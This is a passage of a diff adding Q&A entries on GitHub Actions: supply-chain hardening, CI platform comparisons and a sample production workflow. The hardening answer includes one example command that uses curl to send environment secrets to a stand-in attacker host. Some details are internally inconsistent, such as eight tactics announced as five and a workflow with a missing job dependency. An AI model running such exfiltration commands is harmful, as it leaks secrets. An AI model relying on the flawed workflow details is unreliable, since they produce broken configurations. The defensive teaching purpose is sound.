+Cost note: monitoring matters. github.com/billing/usage shows minute usage by workflow and runner type. Set hard budgets per repo with usage-limits action; alert when daily spend exceeds expected. Without monitoring, a runaway loop in a workflow file can rack up real money before anyone notices.`,
+      },
+      {
+        question: 'Walk through hardening a production GitHub Actions setup against supply-chain attacks.',
+        answer: `Five hardening tactics, in priority order. Each addresses a real attack vector that has been demonstrated in the wild.
+
+Tactic 1: SHA-pin every third-party action. The single highest-value hardening step.
+
+The attack: tags in git are mutable. v4 today points at commit ABC; tomorrow the maintainer (or attacker who compromised the maintainer\'s account) can re-tag v4 to point at malicious commit XYZ. Every consumer\'s next workflow run pulls the malicious commit. The tj-actions/changed-files supply-chain attack of March 2025 was exactly this: an attacker compromised a maintainer\'s PAT, retagged stable releases to a commit that exfiltrated repository secrets via a webhook. Hundreds of repos were compromised before detection.
+
+The fix:
+
+\`\`\`yaml
+- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+- uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a  # v4.0.0
+\`\`\`
+
+40-char SHA pin with comment for human readability. SHAs are content-addressed; if upstream re-tags, your reference still points at the original commit. Dependabot generates PRs to bump SHAs to the latest version of a tag, with full diff visible.
+
+Apply to: every third-party action. First-party (actions/* maintained by GitHub) is lower-risk but the same hardening still applies — supply-chain compromise of GitHub itself is rare but not zero.
+
+Tactic 2: minimize GITHUB_TOKEN permissions. Default token has broad write to most repo resources.
+
+\`\`\`yaml
+permissions:
+  contents: read
+  id-token: write
+  packages: write
+  pull-requests: write
+\`\`\`
+
+At workflow level for the maximum permissions any job needs; tighter at job level if some jobs need less. Set the org default to read in .github/settings.yml or org settings. Now every workflow opts in to write permissions explicitly; reviewers see the diff.
+
+Tactic 3: replace long-lived cloud credentials with OIDC federation. Detailed in the OIDC question above. Every long-lived credential in repo secrets is a target; eliminating them eliminates the target.
+
+Tactic 4: harden the runner against malicious workflow changes. The "fork PR" problem: a contributor opens a PR from their fork. By default, that PR\'s workflow can run on your runners. If they\'ve modified the workflow to add curl https://attacker.com/exfil -d "$(env)", they get your secrets.
+
+Mitigations:
+
+Default behaviour for fork PRs: pull_request triggered runs use the workflow from the base branch and have access only to public secrets — no AWS keys, no NPM tokens, etc. This is the right default.
+
+pull_request_target trigger uses the workflow from the base branch but gives access to repo secrets. Useful for some workflows (commenting on PRs, applying labels) but dangerous for build/test workflows. Reserve it for read-only operations.
+
+Required workflows (org-level): mandate certain workflows run on every PR; contributors cannot bypass them.
+
+Branch protection: require PR review before merge; require status checks to pass; require signed commits if you sign.
+
+Tactic 5: use GitHub Environments with required reviewers for production. Environments are more than secret namespaces; they support deployment protection rules.
+
+\`\`\`yaml
+jobs:
+  deploy-prod:
+    environment:
+      name: production
+      url: https://app.example.com
+    runs-on: ubuntu-latest
+    steps: [...]
+\`\`\`
+
+Configure the production environment with: required reviewers (a deployment to this environment pauses until a designated reviewer clicks Approve); wait timer (delay between approval and start, so a reviewer can think before clicking); branch restrictions (only main can deploy to prod). Even a compromised main can\'t auto-deploy without human approval.
+
+Tactic 6: scan workflows themselves. Tools like StepSecurity\'s Harden-Runner watch the runner network egress and alert on unexpected outbound calls. zizmor (recent OSS) is a static analyzer for GitHub Actions YAML — flags pinning issues, permission issues, unsafe patterns. actionlint catches YAML mistakes. Run these as part of CI on the workflow files themselves.
+
+Tactic 7: manage secrets discipline. Scope secrets to the smallest envelope: environment-scoped secrets (only available when a workflow deploys to that environment) over repo-scoped over org-scoped. Audit secret usage regularly. Rotate on compromise even if you also use OIDC — defense in depth.
+
+Tactic 8: audit log. github.com/organizations/{org}/audit-log shows every action by every user. Pipe to SIEM (Splunk, Datadog, OpenSearch) for retention beyond 90 days and correlation with other security events.
+
+Real-world pattern combining these: every workflow file starts with explicit permissions: minimal block; every third-party action is SHA-pinned; deployments use environments with required reviewers; long-lived secrets are eliminated in favor of OIDC; Dependabot keeps actions current; StepSecurity Harden-Runner monitors egress. Time to set up: half a day for a single repo; weeks for an org-wide migration. Time to recover from a compromise without these: days to months and eternal credential rotation.`,
+      },
+      {
+        question: 'Compare GitHub Actions, Jenkins, and GitLab CI — when do you pick which?',
+        answer: `Three platforms with overlapping capability and meaningfully different positioning. The right choice depends on where your code lives, your operational appetite, your security posture, and your scale.
+
+GitHub Actions. Strengths: largest action marketplace (~25k actions, growing); native to GitHub (PR comments, status checks, Pages, Packages, Releases all integrate without setup); generous free tier including hosted runners; reusable workflows + composite actions provide a real reuse story; OIDC federation to clouds is mature; merge queue, dependabot, code-scanning, secret-scanning are all integrated as GitHub features rather than bolted on. Weaknesses: GitHub-locked (you can\'t use GHA without a GitHub repo); hosted runners have minute caps that bite for large monorepos; YAML logic gets gnarly past a certain complexity; less flexibility than Groovy when you genuinely need it.
+
+When to pick GitHub Actions: you\'re on GitHub and have no specific reason to be elsewhere. OSS projects (free for public repos). Most product companies in 2026. The default for greenfield CI in most contexts.
+
+Jenkins. Strengths: maximum flexibility (Groovy is a real language; Jenkinsfile can do anything); self-hosted by default (on-prem, air-gapped, regulated environments are first-class); ~1,800 plugins covering every conceivable integration; mature shared-libraries pattern for org-wide reuse; Jenkins X / cloud-native variants exist for Kubernetes-first shops. Weaknesses: operational overhead is real (Jenkins masters need ongoing care, plugins need security review and patching, Groovy requires real expertise); the plugin ecosystem is variably maintained (security CVEs are frequent; the 2024 CVE-2024-23897 was a major one); UX feels dated in 2026; cloud-native deployment requires bolt-ons.
+
+When to pick Jenkins: regulated industries with strict on-prem or air-gapped requirements; existing massive Jenkins investment that\'s working; complex pipelines beyond YAML\'s reasonable reach; environments where SaaS CI is forbidden by policy. New Jenkins adoptions in 2026 are rare outside these contexts.
+
+GitLab CI. Strengths: integrated with GitLab\'s full DevSecOps platform (one vendor for SCM, CI, container registry, package registry, security scanning, issue tracking); declarative YAML with rule-based logic that handles complex conditional flows; strong free tier including built-in container registry and Dependency Proxy; SAST/DAST/dependency-scanning integrated rather than bolted on; native multi-cluster Kubernetes deploy via Auto DevOps; GitLab CI/CD is a polished single-pane-of-glass experience.
+
+When to pick GitLab CI: you\'re on GitLab. Self-managed GitLab gives you the integrated platform on-prem (a Jenkins alternative for on-prem with a much better UX). Teams that want a single vendor for the whole DevSecOps stack and are willing to commit to GitLab.
+
+CircleCI. Strengths: fastest hosted runners in benchmarks; mature parallelism (auto-split tests by timing); orbs are well-designed; per-second billing instead of per-minute. Weaknesses: smaller ecosystem than GHA; SCM-agnostic but most users are on GitHub anyway, where GHA is "free"; pricing competitive but not cheap.
+
+When to pick CircleCI: build-time-sensitive teams that need sub-minute pipeline starts; teams that already have CircleCI and it\'s working. Greenfield CircleCI adoptions in 2026 are uncommon — GHA usually wins on integration; everything else wins on something else.
+
+Tekton. Strengths: Kubernetes-native (pipelines are CRDs); good fit for cloud-native platforms; portable across K8s clusters. Weaknesses: needs a Kubernetes cluster as the CI backend (not for small shops); UX is YAML-heavy and lower-level than GHA/GitLab; smaller community. Used as the engine under Jenkins X, OpenShift Pipelines, Tekton Hub.
+
+When to pick Tekton: platform teams building internal CI as a Kubernetes platform service; multi-tenant CI for many internal customers where K8s-native is a hard requirement.
+
+Argo Workflows. Strengths: K8s-native with stronger DAG/parallel-step model than Tekton; great for ML pipelines, data engineering, scheduled batch CI. Weaknesses: positioned more for general workflow orchestration than CI specifically; teams often combine Argo Workflows for some workloads with GHA/GitLab for others.
+
+When to pick Argo Workflows: you\'re running heavy K8s and need DAG-shaped batch + CI; ML pipelines (Kubeflow Pipelines is built on Argo Workflows).
+
+Buildkite. Strengths: hybrid SaaS + self-hosted-agents model; UI hosted by Buildkite, agents on your infrastructure (full control over compute, security, scaling); pipelines support dynamic generation in any language; well-suited to mega-monorepos. Weaknesses: less mainstream; pricing for SaaS frontend.
+
+When to pick Buildkite: large-scale monorepos or organizations that want SaaS UX with full self-hosted execution; teams that need fine-grained agent fleet management; AirBnB, Shopify, Pinterest scale.
+
+Pragmatic 2026 decision tree:
+
+On GitHub, no specific reason to be elsewhere → GitHub Actions.
+
+On GitLab → GitLab CI.
+
+Need on-prem and won\'t accept SaaS for any reason → self-managed GitLab CI (better UX than Jenkins) or Jenkins (legacy/maximum-flex).
+
+Mega-monorepo with self-hosted-agents discipline → Buildkite.
+
+K8s-native, building internal CI platform → Tekton or Argo Workflows.
+
+ML-heavy pipelines → Argo Workflows / Kubeflow Pipelines.
+
+Speed-sensitive on legacy CircleCI that\'s working → stay; otherwise migrate to GHA.
+
+Greenfield in 2026, no constraints → GitHub Actions, full stop.
+
+The integration tax is the single biggest factor. CI that\'s in the same UI as your code review, package registry, deploy targets is genuinely better than CI that requires you to context-switch. GitHub Actions wins this for GitHub repos; GitLab CI wins it for GitLab repos. The right answer is "wherever your code lives" unless you have a specific reason otherwise.`,
+      },
+      {
+        question: 'Show me a "production-grade" GitHub Actions workflow — what would you put in it?',
+        answer: `A production-grade workflow is the combination of every hardening practice and ergonomic pattern from the previous answers. Below is a single workflow that does PR validation + main-branch deploy with the patterns I\'d expect to see in a healthy 2026 setup.
+
+\`\`\`yaml
+name: CI
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+  push:
+    branches: [main]
+  workflow_dispatch:        # manual trigger for re-runs
+
+# Default-deny permissions; jobs opt in to what they need.
+permissions:
+  contents: read
+
+# Cancel in-progress runs for the same ref when a new push lands.
+# Don't cancel main-branch deploys (cancel-in-progress: false on the deploy job).
+concurrency:
+  group: ci-\${{ github.workflow }}-\${{ github.ref }}
+  cancel-in-progress: \${{ github.event_name == 'pull_request' }}
+
+env:
+  NODE_VERSION: '20'
+  REGISTRY: ghcr.io
+
+jobs:
+  # ─── Detect what changed ─────────────────────────────────────
+  paths:
+    runs-on: ubuntu-latest
+    outputs:
+      backend:  \${{ steps.filter.outputs.backend }}
+      frontend: \${{ steps.filter.outputs.frontend }}
+      infra:    \${{ steps.filter.outputs.infra }}
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11   # v4.1.1
+      - uses: dorny/paths-filter@de90cc6fb38fc0963ad72b210f1f284cd68cea36 # v3.0.2
+        id: filter
+        with:
+          filters: |
+            backend:  ['apps/backend/**', 'packages/shared/**']
+            frontend: ['apps/frontend/**', 'packages/shared/**']
+            infra:    ['infra/**']
+
+  # ─── Lint & type-check (fast, runs on everything) ────────────
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: ./.github/actions/setup-stack
+        with: { node-version: \${{ env.NODE_VERSION }} }
+      - run: pnpm lint
+      - run: pnpm typecheck
+
+  # ─── Unit tests, sharded for parallelism ─────────────────────
+  test-backend:
+    needs: paths
+    if: needs.paths.outputs.backend == 'true'
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4]
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: ./.github/actions/setup-stack
+        with: { node-version: \${{ env.NODE_VERSION }} }
+      - run: pnpm --filter @app/backend test -- --shard=\${{ matrix.shard }}/4
+      - uses: actions/upload-artifact@5d5d22a31266ced268874388b861e4b58bb5c2f3 # v4.3.1
+        if: always()
+        with:
+          name: junit-backend-\${{ matrix.shard }}
+          path: apps/backend/junit.xml
+          retention-days: 7
+
+  # ─── Security scans ──────────────────────────────────────────
+  security:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      security-events: write   # for SARIF upload to code-scanning
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: github/codeql-action/init@012739e5082ff0c22ca6d6ab32e07c36df03c4a4 # v3.27.4
+        with: { languages: typescript }
+      - uses: github/codeql-action/analyze@012739e5082ff0c22ca6d6ab32e07c36df03c4a4
+      - uses: aquasecurity/trivy-action@18f2510ee396bbf400402947b394f2dd8c87dbb0 # 0.28.0
+        with:
+          scan-type: 'fs'
+          format: 'sarif'
+          output: 'trivy.sarif'
+      - uses: github/codeql-action/upload-sarif@012739e5082ff0c22ca6d6ab32e07c36df03c4a4
+        with: { sarif_file: trivy.sarif }
+
+  # ─── Build & push container ──────────────────────────────────
+  build:
+    needs: [lint, test-backend, security]
+    if: github.ref == 'refs/heads/main' && needs.paths.outputs.backend == 'true'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      packages: write          # GHCR push
+      id-token: write          # cosign keyless signing
+    outputs:
+      digest: \${{ steps.push.outputs.digest }}
+      tag:    \${{ steps.meta.outputs.tags }}
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: docker/setup-buildx-action@4fd812986e6c8c2a69e18311145f9371337f27d4 # v3.4.0
+      - uses: docker/login-action@9780b0c442fbb0e2ee2b89b7d0d6b6c0d6c4a0d6  # v3.2.0
+        with:
+          registry: \${{ env.REGISTRY }}
+          username: \${{ github.actor }}
+          password: \${{ secrets.GITHUB_TOKEN }}
+      - uses: docker/metadata-action@8e5442c4ef9f78752691e2d8f8d19755c6f78e81  # v5.5.1
+        id: meta
+        with:
+          images: \${{ env.REGISTRY }}/\${{ github.repository }}/backend
+          tags: |
+            type=sha,format=long
+            type=ref,event=branch
+      - uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75 # v6.9.0
+        id: push
+        with:
+          context: ./apps/backend
+          push: true
+          tags: \${{ steps.meta.outputs.tags }}
+          cache-from: type=gha
+          cache-to:   type=gha,mode=max
+          provenance: true       # SLSA provenance attestation
+          sbom: true             # SBOM attestation
+      - uses: sigstore/cosign-installer@4959ce089c160fddf62f7b42464195ba1a56d382 # v3.6.0
+      - run: cosign sign --yes \${{ env.REGISTRY }}/\${{ github.repository }}/backend@\${{ steps.push.outputs.digest }}
+
+  # ─── Deploy to staging via OIDC ──────────────────────────────
+  deploy-staging:
+    needs: build
+    runs-on: ubuntu-latest
+    environment:
+      name: staging
+      url: https://staging.example.com
+    permissions:
+      id-token: write
+      contents: read
+    concurrency:
+      group: deploy-staging
+      cancel-in-progress: false   # don't interrupt deploys
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-staging
+          aws-region: us-east-1
+      - run: |
+          aws ecs update-service \\
+            --cluster prod \\
+            --service backend \\
+            --force-new-deployment \\
+            --task-definition $(./scripts/render-taskdef.sh \${{ needs.build.outputs.digest }})
+
+  # ─── Deploy to production with required reviewer ─────────────
+  deploy-prod:
+    needs: deploy-staging
+    runs-on: ubuntu-latest
+    environment:
+      name: production            # required-reviewer protection rule
+      url: https://app.example.com
+    permissions:
+      id-token: write
+      contents: read
+    concurrency:
+      group: deploy-prod
+      cancel-in-progress: false
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-prod
+          aws-region: us-east-1
+      - run: ./scripts/deploy-prod.sh \${{ needs.build.outputs.digest }}
+\`\`\`
+
+What this demonstrates, in order:
+
+Workflow-level concurrency cancels redundant PR runs but lets deploy jobs finish.
+
+Default-deny permissions, opt-in per job.
+
+Paths filter avoids running backend tests on a frontend-only PR.
+
+Shared composite action (./.github/actions/setup-stack) eliminates copy-paste of Node/pnpm setup across jobs.
+
+Test sharding parallelizes the slowest job.
+
+Test artifacts uploaded with explicit retention (default 90 days is too generous for routine CI).
+
+Security scans run on every PR with results uploaded to code-scanning for visibility.
+
+Build job runs only on main, only when backend code changed, with GHA layer cache.
+
+Built image gets SLSA provenance attestation and SBOM attestation (provenance: true and sbom: true on docker/build-push-action are SLSA Level 2-equivalent), then signed via cosign keyless (uses the OIDC token to sign without a private key).
+
+Staging deploy via OIDC role assumption — no long-lived AWS keys.
+
+Production deploy uses a GitHub Environment with required-reviewer protection — even main branch can\'t auto-deploy without human approval.
+
+Deploy concurrency groups (cancel-in-progress: false) prevent overlapping deploys.
+
+Every third-party action pinned by SHA with version comment.
+
+What\'s missing or omitted for brevity: secret rotation policy, a merge-queue config (separate file), Dependabot config (separate file), a pre-commit lint step run locally via husky/lefthook, post-deploy smoke tests, rollback automation. Each of those is real production work beyond what fits in one workflow.
+
+The cumulative effect is: PRs run in 4-8 minutes; main pushes deploy to staging in 12-15 minutes; production requires a human approval; supply-chain attack surface is minimized; deploy credentials never leave AWS STS\'s 1-hour window. This is what "production-grade" looks like in 2026.`,
+      },
+    ],
+    references: [
+      'https://docs.github.com/en/actions',
+      'https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions',
+      'https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect',
+      'https://docs.github.com/en/actions/using-workflows/reusing-workflows',
+      'https://github.com/actions/actions-runner-controller',
+      'https://www.stepsecurity.io/blog/pinning-github-actions-by-commit-sha',
+      'https://www.jetbrains.com/lp/devecosystem-2024/',
     ],
   },
 
